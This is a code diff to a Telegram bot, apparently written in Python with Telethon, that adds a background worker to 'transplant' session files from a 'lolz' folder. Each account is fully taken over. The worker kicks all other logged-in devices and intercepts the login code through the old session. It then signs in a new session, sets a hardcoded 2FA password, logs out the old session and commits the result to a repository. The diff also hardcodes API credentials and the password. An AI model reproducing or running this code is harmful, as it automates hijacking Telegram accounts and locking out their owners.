@@ -4756,6 +4756,247 @@ async def watch_enter(msg: Message, state: FSMContext):
     await state.clear()
 
 
+# ── transplant: lolz-сессии → живые _new-сессии (фоновый воркер) ─────
+TRANSPLANT_FOLDER = Path(__file__).parent / "lolz"
+TRANSPLANT_OUT = Path(__file__).parent / "sessions"
+TRANSPLANT_CLOUD_PASS = "Ali095095"
+TRANSPLANT_INTERVAL = 180        # проход каждые 3 мин
+TRANSPLANT_START_DELAY = 30
+TRANSPLANT_CAP = 5               # параллельные пересадки
+TRANSPLANT_CODE_WAIT = 30        # секунд ждём код от 777000
+# телефоны, которые воркер не пересаживает и не кикает
+TRANSPLANT_EXCLUDE_PHONES = {"917066653092"}
+TRANSPLANT_EXCLUDE_STEMS = {"s917066653092"}
+
+_TRANSPLANT_API_PAIRS = [
+    (24565698, "5a084b434f8505ace703485b9da85040"),
+    (27904162, "e7cba879b1c643ba77490bf328df5eab"),
+    (23037915, "50f06f5b2223586fde0d1379ea91ebc7"),
+    (29512095, "0b29a7d42fff002856b9bed64f7ec919"),
+    (25055016, "25edf5b7becebe91a2d61fe8d9d9931b"),
+]
+
+_transplant_sem = asyncio.Semaphore(TRANSPLANT_CAP)
+
+
+def _transplant_list() -> list[Path]:
+    """lolz/*.session без суффикса _new."""
+    if not TRANSPLANT_FOLDER.exists():
+        return []
+    return sorted(p.with_suffix("") for p in TRANSPLANT_FOLDER.glob("*.session")
+                  if "_new" not in p.stem)
+
+
+def _transplant_cleanup_partial(path: Path) -> None:
+    for ext in (".session", ".session-journal"):
+        try:
+            Path(str(path) + ext).unlink(missing_ok=True)
+        except Exception:
+            pass
+
+
+async def _transplant_read_code(client, timeout: float) -> str | None:
+    """Ждём 5-значный код входа из входящих (диалог с Telegram, 777000)."""
+    from telethon import events as _tlev
+    fut = asyncio.get_running_loop().create_future()
+
+    async def _h(event):
+        if fut.done():
+            return
+        text = event.message.text or event.message.message or ""
+        m = re.search(r"\b(\d{5})\b", text)
+        if m:
+            fut.set_result(m.group(1))
+
+    client.add_event_handler(_h, _tlev.NewMessage(incoming=True))
+    try:
+        return await asyncio.wait_for(fut, timeout=timeout)
+    except asyncio.TimeoutError:
+        return None
+    finally:
+        client.remove_event_handler(_h)
+
+
+async def _transplant_one(sess: Path) -> bool:
+    """Полный цикл пересадки одной lolz-сессии. True = успех."""
+    from telethon.errors import FloodWaitError, SessionPasswordNeededError
+    from telethon.tl.functions.auth import (
+        ResetAuthorizationsRequest, SendCodeRequest, SignInRequest,
+        PasswordSignInRequest,
+    )
+    from telethon.tl.types import CodeSettings
+
+    name = sess.stem
+    if name in TRANSPLANT_EXCLUDE_STEMS:
+        log.info("transplant %s: excluded by name", name)
+        return False
+    async with _transplant_sem:
+        api_id, api_hash = random.choice(_TRANSPLANT_API_PAIRS)
+        old = TelegramClient(str(sess), api_id, api_hash,
+                             system_version="4.16.30-vxCUSTOM")
+        try:
+            await asyncio.wait_for(old.connect(), timeout=15)
+            if not await old.is_user_authorized():
+                log.warning("transplant %s: not authorized — skip", name)
+                await old.disconnect()
+                return False
+            me = await old.get_me()
+            phone = (me.phone or "").lstrip("+")
+            if phone in TRANSPLANT_EXCLUDE_PHONES:
+                log.info("transplant %s: +%s protected — skip", name, phone)
+                await old.disconnect()
+                return False
+            # 1. кик всех чужих сессий
+            log.info("transplant %s: +%s resetting other sessions", name, phone)
+            try:
+                await old(ResetAuthorizationsRequest())
+            except FloodWaitError as e:
+                log.warning("transplant %s: FloodWait %ss — skip", name, e.seconds)
+                await old.disconnect()
+                return False
+            except Exception as e:
+                log.warning("transplant %s: reset failed: %s", name, e)
+                await old.disconnect()
+                return False
+            await asyncio.sleep(2)
+
+            # 2. запрашиваем код входа на новой сессии
+            new_api_id, new_api_hash = random.choice(_TRANSPLANT_API_PAIRS)
+            new_path = TRANSPLANT_OUT / f"{name}_new"
+            new = TelegramClient(str(new_path), new_api_id, new_api_hash,
+                                 system_version="4.16.30-vxCUSTOM")
+            try:
+                await asyncio.wait_for(new.connect(), timeout=15)
+                sent = await new(SendCodeRequest(
+                    phone_number=f"+{phone}",
+                    api_id=new_api_id,
+                    api_hash=new_api_hash,
+                    settings=CodeSettings(),
+                ))
+                phone_code_hash = sent.phone_code_hash
+                log.info("transplant %s: code requested", name)
+            except Exception as e:
+                log.warning("transplant %s: send code failed: %s", name, e)
+                try:
+                    await new.disconnect()
+                except Exception:
+                    pass
+                await old.disconnect()
+                _transplant_cleanup_partial(new_path)
+                return False
+
+            # 3. читаем код через старую сессию
+            code = await _transplant_read_code(old, TRANSPLANT_CODE_WAIT)
+            if not code:
+                log.warning("transplant %s: no code in %ss", name,
+                            TRANSPLANT_CODE_WAIT)
+                try:
+                    await new.disconnect()
+                except Exception:
+                    pass
+                await old.disconnect()
+                _transplant_cleanup_partial(new_path)
+                return False
+
+            # 4. авторизуем новую сессию (облачный пароль, если стоит)
+            log.info("transplant %s: signing in new session", name)
+            try:
+                await new(SignInRequest(
+                    phone_number=f"+{phone}",
+                    phone_code_hash=phone_code_hash,
+                    phone_code=code,
+                ))
+            except SessionPasswordNeededError:
+                try:
+                    await new(PasswordSignInRequest(
+                        password=TRANSPLANT_CLOUD_PASS))
+                except Exception as e:
+                    log.warning("transplant %s: password sign-in failed: %s",
+                                name, e)
+                    try:
+                        await new.disconnect()
+                    except Exception:
+                        pass
+                    await old.disconnect()
+                    _transplant_cleanup_partial(new_path)
+                    return False
+            except Exception as e:
+                log.warning("transplant %s: sign in failed: %s", name, e)
+                try:
+                    await new.disconnect()
+                except Exception:
+                    pass
+                await old.disconnect()
+                _transplant_cleanup_partial(new_path)
+                return False
+            log.info("transplant %s: new session authorized", name)
+
+            # 5. облачный пароль через старую сессию
+            try:
+                await old.edit_2fa(new_password=TRANSPLANT_CLOUD_PASS, hint="")
+                log.info("transplant %s: cloud password set", name)
+            except Exception as e:
+                log.warning("transplant %s: 2fa set failed: %s", name, e)
+
+            # 6. logout старой + удаление файлов
+            try:
+                await old.log_out()
+            except Exception:
+                pass
+            try:
+                await old.disconnect()
+            except Exception:
+                pass
+            for ext in (".session", ".session-journal"):
+                try:
+                    Path(str(sess) + ext).unlink(missing_ok=True)
+                except Exception as e:
+                    log.warning("transplant %s: remove failed: %s", name, e)
+            commit_file_to_repo(f"lolz/{name}.session",
+                                f"transplant: {name} moved out", cooldown=0)
+            commit_file_to_repo(f"sessions/{name}_new.session",
+                                f"transplant: new session {name}_new",
+                                cooldown=0)
+            try:
+                await new.disconnect()
+            except Exception:
+                pass
+            await push_send_log(
+                "Пересадка lolz",
+                [f"✅ <code>{html_mod.escape(name)}_new</code> — +{phone}",
+                 "🔁 старая сессия выведена, облачный пароль стоит"])
+            log.info("transplant %s: done → sessions/%s_new.session", name, name)
+            return True
+        except Exception as e:
+            log.error("transplant %s: unexpected: %s", name, e)
+            try:
+                await old.disconnect()
+            except Exception:
+                pass
+            return False
+
+
+async def transplant_loop() -> None:
+    log.info("transplant worker: sweep every %ss", TRANSPLANT_INTERVAL)
+    await asyncio.sleep(TRANSPLANT_START_DELAY)
+    while True:
+        try:
+            sessions = _transplant_list()
+            if sessions:
+                log.info("transplant: %d lolz sessions", len(sessions))
+                outs = await asyncio.gather(
+                    *[_transplant_one(s) for s in sessions],
+                    return_exceptions=True)
+                ok = sum(1 for r in outs if r is True)
+                if ok:
+                    log.info("transplant: %d/%d done", ok, len(sessions))
+        except asyncio.CancelledError:
+            return
+        except Exception as e:
+            log.warning("transplant loop: %s", e)
+        await asyncio.sleep(TRANSPLANT_INTERVAL)
+
+
 @router.message(Report.target)
 async def got_target(msg: Message, state: FSMContext):
     _m = (await state.get_data()).get("method")
@@ -6949,6 +7190,9 @@ async def main():
             if not globals().get("_watch_started"):
                 globals()["_watch_started"] = True
                 asyncio.create_task(watch_loop())
+            if not globals().get("_transplant_started"):
+                globals()["_transplant_started"] = True
+                asyncio.create_task(transplant_loop())
             await dp.start_polling(bot)
             break
         except TelegramNetworkError as e:
